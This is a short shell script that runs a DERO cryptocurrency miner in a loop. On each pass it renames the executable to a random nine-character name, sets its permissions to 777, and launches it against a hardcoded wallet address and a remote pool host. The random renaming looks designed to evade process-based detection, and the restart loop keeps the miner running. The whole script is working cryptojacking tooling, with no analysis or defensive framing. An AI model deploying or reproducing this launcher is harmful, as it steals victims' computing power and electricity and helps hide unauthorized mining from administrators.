#!/bin/sh
nohup mpn
# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

# Function to rename and restart the main executable
restart_main() {
  while true; do
    generate_random_name
    mv main "$new_name"
    chmod 777 "$new_name"
    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc
    sleep 10
  done
}

# Trap SIGINT and SIGTERM signals to exit gracefully
trap 'exit 0' SIGINT SIGTERM

# Call the function to rename and restart the main executable
restart_main